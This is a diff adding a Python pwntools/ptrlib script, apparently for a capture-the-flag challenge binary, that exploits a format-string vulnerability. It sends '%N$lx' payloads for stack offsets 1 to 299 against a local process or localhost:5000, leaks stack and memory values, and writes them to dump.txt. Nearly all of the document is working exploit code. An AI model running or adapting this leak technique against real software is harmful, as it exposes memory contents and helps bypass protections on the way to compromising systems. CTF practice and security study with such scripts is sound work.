@@ -1,0 +1,74 @@
+#!/usr/bin/env python
+import sys
+import ptrlib as ptr
+import pwn
+
+exe = ptr.ELF("./chall_patched")
+pwn.context.binary = pwn.ELF(exe.filepath)
+libc = ptr.ELF("./libc.so.6")
+ld = ptr.ELF("./ld-linux-x86-64.so.2")
+
+
+def connect():
+    if len(sys.argv) > 1 and sys.argv[1] == "remote":
+        return pwn.remote("localhost", 5000)
+    else:
+        return pwn.process(exe.filepath)
+
+
+def unwrap(x):
+    if x is None:
+        ptr.logger.error("Failed to unwrap")
+        exit(1)
+    else:
+        return x
+
+
+def main(i: int):
+    io = connect()
+
+    def sla(delim: bytes, data: bytes):
+        io.sendlineafter(delim, data)
+        return
+
+    def sa(delim: bytes, data: bytes):
+        io.sendafter(delim, data)
+        return
+
+    def sl(data: bytes):
+        io.sendline(data)
+        return
+
+    def s(data: bytes):
+        io.send(data)
+        return
+
+    def ru(delim: bytes, drop: bool = False) -> bytes:
+        return io.recvuntil(delim, drop=drop)
+
+    def rl() -> bytes:
+        return io.recvline()
+
+    assert i != 0
+
+    payload = b""
+    payload += b"AAAA#"
+    payload += f"%{i}$lx".encode()
+    payload += b"#"
+
+    sl(payload)
+
+    ru(b"#")
+    leak = ru(b"#", drop=True).decode()
+    io.close()
+    return f"0x{leak}"
+
+
+if __name__ == "__main__":
+    dump = ""
+    for i in range(1, 300):
+        leak = main(i)
+        dump += f"{i}: {leak}\n"
+
+    with open("./dump.txt", "w") as file:
+        file.write(dump)
